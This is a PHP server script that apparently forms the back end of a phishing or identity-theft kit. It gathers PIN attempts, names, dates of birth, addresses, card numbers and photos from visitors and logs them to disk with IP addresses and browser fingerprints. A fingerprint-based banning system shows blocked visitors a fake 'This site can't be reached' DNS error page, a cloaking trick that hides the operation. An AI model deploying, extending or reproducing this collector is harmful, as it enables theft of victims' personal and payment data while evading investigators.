<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Debug logging to file
$debugLog = __DIR__ . '/debug.log';

// Reliable IP Detection
$ip = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : (isset($_SERVER['HTTP_X_REAL_IP']) ? $_SERVER['HTTP_X_REAL_IP'] : (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown'));
if ($ip !== 'unknown' && strpos($ip, ',') !== false) {
    $ips = explode(',', $ip);
    $ip = trim($ips[0]);
}

// Triple-Lock Banning Files
$bannedDevicesFile = __DIR__ . '/banned_devices.txt';
$bannedIpsFile = __DIR__ . '/banned_ips.txt';
$bannedFingerprintsFile = __DIR__ . '/banned_fingerprints.json';
$stateFile = __DIR__ . '/latest_state.json';

// Helper: load banned fingerprints
function loadBannedFingerprints() {
    global $bannedFingerprintsFile;
    if (!file_exists($bannedFingerprintsFile)) return [];
    $content = @file_get_contents($bannedFingerprintsFile);
    if ($content === false) return [];
    $data = json_decode($content, true);
    return is_array($data) ? $data : [];
}

// Helper: save banned fingerprints
function saveBannedFingerprints($fingerprints) {
    global $bannedFingerprintsFile;
    $json = json_encode($fingerprints, JSON_PRETTY_PRINT);
    if ($json === false) return false;
    return @file_put_contents($bannedFingerprintsFile, $json);
}

// Triple-Lock Check Function
function checkTripleLock($deviceId, $ip, $fingerprint) {
    global $bannedDevicesFile, $bannedIpsFile, $stateFile;
    $matchDetails = [];

    // --- LOCK 1: Explicit (DeviceId + IP) ---
    if ($deviceId !== 'unknown' && $deviceId !== '' && file_exists($bannedDevicesFile)) {
        $bannedDevices = file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $bannedDevices = array_map('trim', $bannedDevices);
        if (in_array($deviceId, $bannedDevices, true)) {
            $matchDetails[] = 'Lock1-DeviceId';
        }
    }
    if ($ip !== 'unknown' && $ip !== '' && file_exists($bannedIpsFile)) {
        $bannedIps = file($bannedIpsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $bannedIps = array_map('trim', $bannedIps);
        if (in_array($ip, $bannedIps, true)) {
            $matchDetails[] = 'Lock1-IP';
        }
    }

    // --- LOCK 2: Implicit (Canvas + WebGL Fingerprint) ---
    $fp = $fingerprint;
    if (!empty($fp) && is_string($fp)) {
        $fp = json_decode($fp, true);
    }
    if (!is_array($fp)) $fp = [];

    $bannedFps = loadBannedFingerprints();
    foreach ($bannedFps as $bannedFp) {
        // Check canvas hash
        if (!empty($fp['canvasHash']) && !empty($bannedFp['canvasHash'])) {
            if (strtolower($fp['canvasHash']) === strtolower($bannedFp['canvasHash'])) {
                $matchDetails[] = 'Lock2-Canvas';
                break;
            }
        }
        // Check WebGL renderer (more unique than vendor)
        if (!empty($fp['webGLRenderer']) && !empty($bannedFp['webGLRenderer'])) {
            if (strtolower($fp['webGLRenderer']) === strtolower($bannedFp['webGLRenderer'])) {
                $matchDetails[] = 'Lock2-WebGL';
                break;
            }
        }
    }

    // --- LOCK 3: Profile Matching (Behavioral/Server) ---
    if (file_exists($stateFile)) {
        $state = json_decode(file_get_contents($stateFile), true);
        if (is_array($state) && !empty($state)) {
            // Gather all banned deviceIds from Lock 1
            $bannedDeviceIds = [];
            if (file_exists($bannedDevicesFile)) {
                $lines = file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                $bannedDeviceIds = array_map('trim', $lines);
            }

            // Check if this device shares IP with a banned device
            if ($ip !== 'unknown' && !empty($bannedDeviceIds)) {
                foreach ($bannedDeviceIds as $bannedId) {
                    if (isset($state[$bannedId]) && ($state[$bannedId]['ip'] ?? '') === $ip) {
                        if (!in_array('Lock1-IP', $matchDetails) && !in_array('Lock1-DeviceId', $matchDetails)) {
                            $matchDetails[] = 'Lock3-SharedIP';
                        }
                        break;
                    }
                }
            }

            // Check if fingerprint matches a known banned device profile
            if (!empty($fp) && !empty($bannedDeviceIds)) {
                foreach ($bannedDeviceIds as $bannedId) {
                    if (!isset($state[$bannedId])) continue;
                    $bannedFpStr = $state[$bannedId]['fingerprint'] ?? '';
                    if (empty($bannedFpStr) || $bannedFpStr === '—') continue;
                    $bannedFp = json_decode($bannedFpStr, true);
                    if (!is_array($bannedFp)) continue;

                    // Compute similarity score
                    $score = 0;
                    if (!empty($fp['canvasHash']) && !empty($bannedFp['canvasHash']) && strtolower($fp['canvasHash']) === strtolower($bannedFp['canvasHash'])) $score += 3;
                    if (!empty($fp['webGLRenderer']) && !empty($bannedFp['webGLRenderer']) && strtolower($fp['webGLRenderer']) === strtolower($bannedFp['webGLRenderer'])) $score += 3;
                    if (!empty($fp['webGLVendor']) && !empty($bannedFp['webGLVendor']) && strtolower($fp['webGLVendor']) === strtolower($bannedFp['webGLVendor'])) $score += 1;
                    if (!empty($fp['platform']) && !empty($bannedFp['platform']) && $fp['platform'] === $bannedFp['platform']) $score += 1;
                    if (!empty($fp['hardwareConcurrency']) && !empty($bannedFp['hardwareConcurrency']) && $fp['hardwareConcurrency'] === $bannedFp['hardwareConcurrency']) $score += 1;
                    if (!empty($fp['screen']) && !empty($bannedFp['screen']) && $fp['screen'] === $bannedFp['screen']) $score += 1;

                    if ($score >= 5) {
                        $matchDetails[] = 'Lock3-ProfileMatch(score=' . $score . ')';
                        break;
                    }
                }
            }
        }
    }

    return $matchDetails;
}

function isBanned($deviceId, $ip, $fingerprint = null) {
    global $bannedDevicesFile, $bannedIpsFile;

    // Run Triple-Lock check
    $locks = checkTripleLock($deviceId, $ip, $fingerprint);
    if (!empty($locks)) {
        // If any lock matches, ban
        if ($deviceId !== 'unknown' && $deviceId !== '') {
            $bannedDevices = file_exists($bannedDevicesFile) ? file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
            $bannedDevices = array_map('trim', $bannedDevices);
            if (!in_array($deviceId, $bannedDevices, true)) {
                @file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
            }
        }
        // Set/Refresh cookie
        setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/; SameSite=Lax");
        return true;
    }

    // If NOT matched by any lock but has cookie, clear it (User was likely unbanned)
    if (isset($_COOKIE['banned'])) {
        setcookie('banned', '', time() - 3600, "/; SameSite=Lax");
    }

    return false;
}

function showBannedPage($host) {
    http_response_code(403);
    echo "<!-- DEVICE_BANNED -->";
    ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Site Can't Be Reached</title>
    <style>
        body { background-color: #f1f1f1; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; color: #5f6368; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { max-width: 600px; width: 100%; padding: 20px; }
        .icon { width: 72px; height: 72px; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABIAQMAAABvIyNsAAAABlBMVEUAAAD///+l2Z/dAAAAMklEQVR4AWMYBYJBAAEDYwADAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDYwABygE+m2vFmAAAAABJRU5ErkJggg=='); background-repeat: no-repeat; margin-bottom: 40px; }
        h1 { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 20px; }
        p { font-size: 14px; line-height: 20px; margin-bottom: 10px; }
        .error-code { margin-top: 30px; font-size: 12px; text-transform: uppercase; }
        ul { margin-top: 10px; padding-left: 20px; }
        li { margin-bottom: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon"></div>
        <h1>This site can't be reached</h1>
        <p>Check if there is a typo in <strong><?php echo htmlspecialchars($host); ?></strong>.</p>
        <ul>
            <li>If spelling is correct, try running Windows Network Diagnostics.</li>
        </ul>
        <div class="error-code">DNS_PROBE_FINISHED_NXDOMAIN</div>
    </div>
</body>
</html>
    <?php
    exit;
}

// === GET LICENCE PIN ===
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'getLicencePin') {
    $configFile = __DIR__ . '/.admin_config.json';
    $config = file_exists($configFile) ? json_decode(file_get_contents($configFile), true) : [];
    $pin = isset($config['licence_pin']) ? $config['licence_pin'] : '4575';
    header('Content-Type: application/json');
    echo json_encode(['pin' => $pin]);
    exit;
}

// === CHECK BAN (Early check) ===
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'checkBan') {
    $deviceId = isset($_GET['deviceId']) ? trim($_GET['deviceId']) : '';
    $fingerprintEncoded = isset($_GET['fp']) ? trim($_GET['fp']) : null;
    $fingerprintJson = null;
    if ($fingerprintEncoded) {
        $decoded = base64_decode($fingerprintEncoded, true);
        if ($decoded !== false) {
            $fingerprintData = json_decode($decoded, true);
            if ($fingerprintData) {
                $fingerprintJson = json_encode($fingerprintData);
            }
        }
    }
    $banned = isBanned($deviceId, $ip, $fingerprintJson);

    @file_put_contents(__DIR__ . '/ban_debug.log', date('Y-m-d H:i:s') . " - CheckBan: deviceId=$deviceId, ip=$ip, isBanned=" . ($banned ? 'YES' : 'NO') . "\n", FILE_APPEND);

    if ($banned) {
        @file_put_contents(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Early ban check: $deviceId from IP $ip\n", FILE_APPEND);
        showBannedPage($_SERVER['HTTP_HOST']);
    } else {
        // If not banned, but has banned cookie, clear it (Unban action)
        if (isset($_COOKIE['banned'])) {
            setcookie('banned', '', time() - 3600, "/; SameSite=Lax");
        }
    }
    http_response_code(200);
    echo "OK";
    exit;
}

// === NORMAL LOGGING ===
$rawInput = file_get_contents('php://input');
$data = json_decode($rawInput, true);
if (!$data) {
    $data = isset($_GET) ? $_GET : [];
}

$deviceId = isset($data['deviceId']) ? trim($data['deviceId']) : 'unknown';

// Extract fingerprint for ban checks
$known_keys = ['deviceId', 'ip', 'event', 'success', 'pin_attempt', 'name', 'dob', 'address', 'card', 'photo', 'timestamp'];
$fingerprint_data = [];
foreach ($data as $key => $value) {
    if (!in_array($key, $known_keys)) {
        $fingerprint_data[$key] = $value;
    }
}
$fingerprintJson = !empty($fingerprint_data) ? json_encode($fingerprint_data) : null;

// SECOND BAN CHECK (Full request) - pass fingerprint
if (isBanned($deviceId, $ip, $fingerprintJson)) {
    @file_put_contents(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Banned device (FullRequest): $deviceId from IP $ip\n", FILE_APPEND);
    showBannedPage($_SERVER['HTTP_HOST']);
}

$timestamp = date('Y-m-d H:i:s');
$event       = isset($data['event']) ? $data['event'] : 'unknown';
$success     = (isset($data['success']) && ($data['success'] === true || $data['success'] === 'true' || $data['success'] === 1)) ? true : false;
$pin_attempt = isset($data['pin_attempt']) ? $data['pin_attempt'] : '—';
$name        = isset($data['name']) ? $data['name'] : '—';
$dob         = isset($data['dob']) ? $data['dob'] : '—';
$address     = isset($data['address']) ? $data['address'] : '—';
$card        = isset($data['card']) ? $data['card'] : '—';

// Extract fingerprint for logging (reuse the data from above)
$fingerprint_final = !empty($fingerprint_data) ? json_encode($fingerprint_data) : '—';

// Handle Photo
$photo_path = '—';
$has_photo = false;
if (isset($data['photo']) && !empty($data['photo']) && $deviceId !== 'unknown') {
    $photosDir = __DIR__ . '/photos';
    if (!is_dir($photosDir)) {
        if (!@mkdir($photosDir, 0777, true)) {
            @file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not create photos directory\n", FILE_APPEND);
        }
    }
    if (is_dir($photosDir)) {
        $photo_path = $photosDir . '/' . $deviceId . '.txt';
        if (@file_put_contents($photo_path, $data['photo']) === false) {
            @file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write photo for $deviceId\n", FILE_APPEND);
        } else {
            $has_photo = true;
        }
    }
}

// 1. Update Latest State & Auto-Ban logic
$stateFile  = __DIR__ . '/latest_state.json';
$state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];
if (!is_array($state)) $state = [];

if ($deviceId !== 'unknown') {
        // Track lock status for this device
        $lockStatus = [];
        if ($fingerprintJson) {
            $locks = checkTripleLock($deviceId, $ip, $fingerprintJson);
            $lockStatus = $locks;
        }

        if (!isset($state[$deviceId])) {
            $state[$deviceId] = [
                'deviceId' => $deviceId,
                'ip' => $ip,
                'timestamp' => $timestamp,
                'event' => $event,
                'success' => $success ? 'YES' : 'NO',
                'pin_attempt' => $pin_attempt,
                'name' => $name,
                'dob' => $dob,
                'address' => $address,
                'card' => $card,
                'photo_path' => $photo_path,
                'fingerprint' => $fingerprint_final,
                'lockStatus' => $lockStatus,
                'last_seen' => $timestamp,
                'attempt_count' => 0,
                'failed_attempts' => 0
            ];
        } else {
            $state[$deviceId]['ip'] = $ip;
            $state[$deviceId]['timestamp'] = $timestamp;
            $state[$deviceId]['event'] = $event;
            $state[$deviceId]['success'] = ($success || ($state[$deviceId]['success'] ?? 'NO') === 'YES') ? 'YES' : 'NO';
            if ($pin_attempt !== '—') $state[$deviceId]['pin_attempt'] = $pin_attempt;
            if ($name !== '—') $state[$deviceId]['name'] = $name;
            if ($dob !== '—') $state[$deviceId]['dob'] = $dob;
            if ($address !== '—') $state[$deviceId]['address'] = $address;
            if ($card !== '—') $state[$deviceId]['card'] = $card;
            if ($fingerprint_final !== '—') $state[$deviceId]['fingerprint'] = $fingerprint_final;
            if (!empty($lockStatus)) $state[$deviceId]['lockStatus'] = $lockStatus;
            if ($photo_path !== '—') $state[$deviceId]['photo_path'] = $photo_path;
            $state[$deviceId]['last_seen'] = $timestamp;
        }

        // Auto-ban logic - also store fingerprint for Triple-Lock
        if ($event === 'pin_failed') {
            $state[$deviceId]['failed_attempts'] = ($state[$deviceId]['failed_attempts'] ?? 0) + 1;
            $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;

            if ($state[$deviceId]['failed_attempts'] >= 10) {
                // Auto-ban the device
                $bannedDevicesFile = __DIR__ . '/banned_devices.txt';
                $bannedDevices = file_exists($bannedDevicesFile) ? file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
                $bannedDevices = array_map('trim', $bannedDevices);
                if (!in_array($deviceId, $bannedDevices, true)) {
                    @file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
                }
                // Also store the fingerprint for Lock 2 matching
                if (!empty($fingerprint_data)) {
                    $bannedFps = loadBannedFingerprints();
                    $fpToStore = $fingerprint_data;
                    $fpToStore['banned_deviceId'] = $deviceId;
                    $fpToStore['banned_ip'] = $ip;
                    $fpToStore['banned_at'] = $timestamp;
                    $bannedFps[] = $fpToStore;
                    saveBannedFingerprints($bannedFps);
                }
                // Set cookie for auto-ban too
                setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/; SameSite=Lax");
            }

            // Cross-device canvas auto-ban: if the same canvasHash appears across 3+ devices
            // with failed PIN attempts, auto-ban that canvas fingerprint
            if (!empty($fingerprint_data) && !empty($fingerprint_data['canvasHash'])) {
                $canvasHash = $fingerprint_data['canvasHash'];
                $devicesWithFailedAttempts = 0;
                foreach ($state as $otherId => $otherData) {
                    if ($otherId === $deviceId) continue;
                    if (($otherData['failed_attempts'] ?? 0) > 0) {
                        $otherFpStr = $otherData['fingerprint'] ?? '';
                        if ($otherFpStr && $otherFpStr !== '—') {
                            $otherFp = json_decode($otherFpStr, true);
                            if (is_array($otherFp) && !empty($otherFp['canvasHash']) && $otherFp['canvasHash'] === $canvasHash) {
                                $devicesWithFailedAttempts++;
                            }
                        }
                    }
                }
                // If 3+ different devices share this canvas hash and have failed, auto-ban the canvas
                if ($devicesWithFailedAttempts >= 3) {
                    $bannedFps = loadBannedFingerprints();
                    $alreadyBanned = false;
                    foreach ($bannedFps as $bfp) {
                        if (!empty($bfp['canvasHash']) && strtolower($bfp['canvasHash']) === strtolower($canvasHash)) {
                            $alreadyBanned = true;
                            break;
                        }
                    }
                    if (!$alreadyBanned) {
                        $fpToStore = $fingerprint_data;
                        $fpToStore['banned_deviceId'] = 'cross-device-auto';
                        $fpToStore['banned_ip'] = $ip;
                        $fpToStore['banned_at'] = $timestamp;
                        $fpToStore['banned_reason'] = 'auto-cross-device';
                        $bannedFps[] = $fpToStore;
                        saveBannedFingerprints($bannedFps);
                    }
                }
            }
        } elseif ($event === 'pin_success') {
            $state[$deviceId]['failed_attempts'] = 0;
            $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;
        }

        if (@file_put_contents($stateFile, json_encode($state, JSON_PRETTY_PRINT)) === false) {
            @file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write stateFile: $stateFile\n", FILE_APPEND);
        }
    }

// 2. Append to Visits History
$visitsLog = __DIR__ . '/visits.log';
$visitEntry = [
    'timestamp' => $timestamp,
    'deviceId' => $deviceId,
    'ip' => $ip,
    'event' => $event,
    'success' => $success,
    'pin_attempt' => $pin_attempt,
    'name' => $name,
    'dob' => $dob,
    'address' => $address,
    'card' => $card,
    'has_photo' => $has_photo
];
if (@file_put_contents($visitsLog, json_encode($visitEntry) . "\n", FILE_APPEND) === false) {
    @file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write to visitsLog: $visitsLog\n", FILE_APPEND);
}

header('Content-Type: application/json');
echo json_encode(["status" => "ok", "logged" => true]);
?>
